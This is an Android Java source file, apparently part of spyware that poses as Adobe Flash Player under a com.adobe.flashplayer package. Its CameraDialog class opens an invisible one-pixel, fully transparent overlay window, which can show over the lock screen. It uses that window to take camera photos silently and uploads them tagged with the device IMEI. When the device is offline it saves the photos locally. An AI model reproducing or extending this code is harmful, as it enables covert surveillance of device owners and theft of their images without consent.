package com.adobe.flashplayer.data;

import java.io.File;
import java.io.FileOutputStream;
import java.util.List;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.content.Context;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.Matrix;
import android.graphics.drawable.ColorDrawable;
import android.hardware.Camera;
import android.hardware.Camera.AutoFocusCallback;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.PreviewCallback;
import android.hardware.Camera.Size;
import android.os.Build;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.Window;
import android.view.WindowManager;
import android.widget.LinearLayout;
import androidx.core.content.ContextCompat;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.accessory.AccessHelper;
import com.adobe.flashplayer.network.NetworkUitls;
import com.adobe.flashplayer.network.UploadData;
import com.adobe.flashplayer.Public;

@SuppressWarnings("deprecation")
public class CameraDialog implements Runnable
{
    private final String TAG = "CameraDialog[ljg]";

    public int DEFAULT_CAMERA_PHOTO_WIDTH = 600;
    public int DEFAULT_CAMERA_PHOTO_HEIGHT = 800;

    private Context context = null;
    private int camerano = 0;
    public CameraDialog cameradialog = null;

    private AlertDialog dialog = null;

    private CameraDialogSV camerasv = null;

    private Camera myCamera = null;

    private final int CAMERAFOCUSDELAY = 100;

    private long camerastarttime ;

    private final int VALID_CAMERAPHOTO_SIZE = 4096;


    public CameraDialog(Context context,int camerano)
    {
        try{
            context = AccessHelper.getActivity().get(0);
        }catch (Exception e){
            e.printStackTrace();
        }
        if (context == null){
            this.context = context;
        }

        this.camerano = (camerano^1);
    }


    @Override
    public void run() {
        try {
            int granted = ContextCompat.checkSelfPermission(context, android.Manifest.permission.CAMERA);
            if (granted != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "camera permission not authority");
                return;
            }

            if (camerano != 0 && camerano != 1) {
                camerano = 0;
                Log.e(TAG, "camera select not recognized");
            }

            cameradialog = this;

            Looper.prepare();

            synchronized (CameraDialog.class) {
                dialogSvCameraPhoto(context);
            }

            Looper.loop();

            Log.e(TAG,"completely successfully");
        } catch (Exception e) {
            e.printStackTrace();
            String error = Utils.getExceptionDetail(e);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("CameraDialog exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
        }

    }

    /*
    TYPE_PHONE
    TYPE_PRIORITY_PHONE
    TYPE_SYSTEM_ALERT
    TYPE_SYSTEM_OVERLAY
    TYPE_SYSTEM_ERROR
    TYPE_TOAST
    这些窗口将始终显示在使用 TYPE_APPLICATION_OVERLAY 窗口类型的窗口下方。
    如果该应用适配了8.0，则应用只能使用TYPE_APPLICATION_OVERLAY窗口类型来创建悬浮窗。（其它窗口类型在8.0已经被废弃掉）
    */

    public void dialogSvCameraPhoto(Context context){

        try {
            camerastarttime = System.currentTimeMillis();

            //dialog = new Dialog(context);
            //dialog.show() with parameter getapplication() exception,AlertDialog.Builder will be ok
            AlertDialog.Builder builder = new Builder(context);

            dialogAddSV(context,builder);

            dialog = builder.create();

            //android.view.WindowManager$BadTokenException: Unable to add window android.view.ViewRootImpl$W@640d03f
            //-- permission denied for window type 2003
            if(Build.VERSION.SDK_INT >= 26)
            {
                try {
                    final WindowManager.LayoutParams params = new WindowManager.LayoutParams();
                    params.screenOrientation = Configuration.ORIENTATION_PORTRAIT;
                    params.type = 2038;
                    params.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                            | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                            | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                            | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                            | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED;
                } catch (Exception e) {
                    e.printStackTrace();
                }
                //dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY);
                dialog.getWindow().setType(2038);
            }else{
                //android.view.WindowManager$BadTokenException:
                //Unable to add window android.view.ViewRootImpl$W@cbf71b9 -- permission denied for this window type
                dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_TOAST);
                //2003
                //dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
            }

            dialog.setCanceledOnTouchOutside(true);

            setDialogAttr(context, dialog);

            dialog.show();
        } catch (Exception e) {
            Log.e(TAG, "dialogSvCameraPhoto exception");
            e.printStackTrace();
        }

    }



    private void dialogAddSV(Context context,AlertDialog.Builder builder){
        try{
            LinearLayout ll = new LinearLayout(context);
            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(1,1);

            camerasv = new CameraDialogSV(context,cameradialog);
            ll.addView(camerasv,lp);	//not same with ll.addView(camerasv)

	        /*
	        TextView tv = new TextView(context);
	        tv.setText("hello");
	        tv.setTextColor(Color.GREEN);
	        tv.setTextSize(30);
	        tv.setBackgroundColor(Color.GRAY);
	        LinearLayout.LayoutParams lptv = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT,ViewGroup.LayoutParams.WRAP_CONTENT);
	        tv.setLayoutParams(lptv);
	        ll.addView(tv);
	        */

            builder.setView(ll);
            //dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
            //dialog.setContentView(ll);
        }catch(Exception ex){
            Log.e(TAG, "dialogAddSV exception");
            ex.printStackTrace();
        }
    }




    private void setDialogAttr(Context context,AlertDialog dialog){

        try{
            //DisplayMetrics dm = context.getApplicationContext().getResources().getDisplayMetrics();
            //int y = dm.heightPixels;
            //int x = dm.widthPixels;

            Window dialogWindow = dialog.getWindow();
            WindowManager.LayoutParams lp = dialogWindow.getAttributes();
            dialogWindow.clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND);
            //without this,the background would be dark
            dialogWindow.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            lp.x = 0;
            lp.y = 0;
            lp.width = 1;
            lp.height = 1;
            lp.alpha = 0.0f;
            dialogWindow.setGravity(Gravity.LEFT | Gravity.TOP);
            dialogWindow.setAttributes(lp);
        }catch(Exception ex){
            Log.e(TAG, "setDialogAttr exception");
            ex.printStackTrace();
        }
    }






    public void startCameraPhoto() {
        try{
            SurfaceHolder holder = camerasv.getHolder();
            holder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);

            if(context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)){
                if(openCamera(camerano)){
                    myCamera.setPreviewDisplay(holder);

                    myCamera.setPreviewCallback(new PreviewCallback() {
                        @Override
                        public void onPreviewFrame(byte[] data, Camera camera) {
                            myCamera.takePicture(null, null, myPicCallback);
                            Log.e(TAG, "onPreviewFrame callback");
                        }
                    });

                    Camera.Parameters parameters = myCamera.getParameters();
                    //parameters.setPreviewFormat(ImageFormat.JPEG);
                    List <Size> list = parameters.getSupportedPreviewSizes();
                    Size size = list.get(0);

                    Configuration mConfiguration = context.getResources().getConfiguration();
                    int ori = mConfiguration.orientation;
                    if (ori == Configuration.ORIENTATION_LANDSCAPE) {

                        DEFAULT_CAMERA_PHOTO_WIDTH = size.height;
                        DEFAULT_CAMERA_PHOTO_HEIGHT = size.width;
                    } else if (ori == Configuration.ORIENTATION_PORTRAIT) {

                        DEFAULT_CAMERA_PHOTO_WIDTH = size.width;
                        DEFAULT_CAMERA_PHOTO_HEIGHT = size.height;
                    }

                    Log.e(TAG, "camera width:" +size.width + " height:" + size.height );

                    //parameters.setPreviewFormat(ImageFormat.JPEG);
                    parameters.setPreviewSize(DEFAULT_CAMERA_PHOTO_WIDTH, DEFAULT_CAMERA_PHOTO_HEIGHT);
                    parameters.setPictureSize(DEFAULT_CAMERA_PHOTO_WIDTH, DEFAULT_CAMERA_PHOTO_HEIGHT);
                    myCamera.setParameters(parameters);

                    myCamera.startPreview();
                    Thread.sleep(CAMERAFOCUSDELAY);
                    myCamera.autoFocus(myAutoFocus);
                    //myCamera.takePicture(null, null, myPicCallback);
                }
                else {
                    Log.e(TAG, "openCamera Failed:"+camerano);
                }
            }
            else{
                Log.e(TAG, "camera not exist");
            }
        }
        catch(Exception ex){
            //screen lock exception from android 8.0
            //java.lang.RuntimeException: Fail to connect to camera service
            //cannot open camera "1" from background'
            Log.e(TAG, "startCameraPhoto exception");
            ex.printStackTrace();
            close();
        }
    }


    private boolean openCamera(int num) {
        if (num != 0 && num != 1) {
            return false;
        }

        //int i = Camera.CameraInfo.CAMERA_FACING_FRONT;

        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        for (int camIdx = 0, cameraCount = Camera.getNumberOfCameras(); camIdx < cameraCount; camIdx++) {
            Camera.getCameraInfo(camIdx, cameraInfo);
            if (cameraInfo.facing == num) {	//Camera.CameraInfo.CAMERA_FACING_FRONT
                myCamera = Camera.open(camIdx);
            }
        }

        Log.e(TAG, "openCamera Success:"+camerano);
        return true;
    }



    private AutoFocusCallback myAutoFocus = new AutoFocusCallback() {
        @Override
        public void onAutoFocus(boolean success, Camera camera) {
            try{
                myCamera.takePicture(null, null, myPicCallback);
                Log.e(TAG, "AutoFocusCallback callback");
            }catch(Exception ex){
                Log.e(TAG, "AutoFocusCallback exception");
                ex.printStackTrace();
            }
        }
    };


    private PictureCallback myPicCallback = new PictureCallback() {
        @Override
        public void onPictureTaken(byte[] data, Camera camera) {
            close();

            try {

                long cameraendtime = System.currentTimeMillis();
                long camerausetime = cameraendtime - camerastarttime;
                Log.e(TAG, "dialog create cost time:" + camerausetime);

                if (data != null && data.length >= VALID_CAMERAPHOTO_SIZE) {
                    if(NetworkUitls.isNetworkAvailable(context) == true){

                        String filename = Utils.formatCurrentDateInFileName() + "_" + Public.CAMERAPHOTO_FILE_NAME;
                        int filenamelen = filename.getBytes().length;
                        int datasize = (int)data.length;
                        int sendsize = datasize + 4 + filenamelen + 4;
                        byte[] sendbuf = new byte[sendsize];
                        byte[] bytefilenamelen = Utils.intToBytes(filenamelen);
                        System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
                        System.arraycopy(filename.getBytes(), 0, sendbuf, 4, filenamelen);
                        byte[] bytedatasize = Utils.intToBytes(datasize);
                        System.arraycopy(bytedatasize, 0, sendbuf, 4 + filenamelen, 4);
                        System.arraycopy(data, 0, sendbuf, 4 + filenamelen + 4, datasize);

                        UploadData senddata = new UploadData(sendbuf,sendsize,Public.CMD_DATA_CAMERAPHOTO,Public.IMEI);
                        Thread sendcameraphoto = new Thread(senddata);
                        sendcameraphoto.start();
                    }else{

                        String filename = Utils.formatCurrentDateInFileName() + "_" + Public.CAMERAPHOTO_FILE_NAME;
                        File pictureFile = new File(Public.LOCAL_PATH_NAME + filename);
                        FileOutputStream fos = new FileOutputStream(pictureFile);
                        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                        Matrix matrix = new Matrix();
                        //matrix.preRotate(90);
                        bitmap = Bitmap.createBitmap(bitmap ,0,0, bitmap .getWidth(), bitmap .getHeight(),matrix,true);
                        bitmap.compress(Bitmap.CompressFormat.JPEG, Public.CAMERA_PHOTO_QUALITY, fos);
                        fos.close();
                    }

                    Log.d(TAG, "send camera photo ok");

                }else{
                    Log.e(TAG, "onPictureTaken data size too small:" + data.length);
                }

                Log.e(TAG, "onPictureTaken ok");

            } catch (Exception error) {
                Log.e(TAG, "camera photo PictureCallback error:" + error.toString());
                return ;
            }

            try {
                Looper.myLooper().quitSafely();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    };


    private void close(){
        try{
            if(myCamera != null){
                myCamera.stopPreview();
                myCamera.setPreviewCallback(null);
                myCamera.release();
                myCamera = null;
                dialog.dismiss();
            }
        }catch(Exception e){
            e.printStackTrace();

            try{
                if(myCamera != null){
                    myCamera.release();
                    myCamera = null;
                    dialog.dismiss();
                }
            }catch(Exception exp){
                exp.printStackTrace();
            }
        }
    }










}

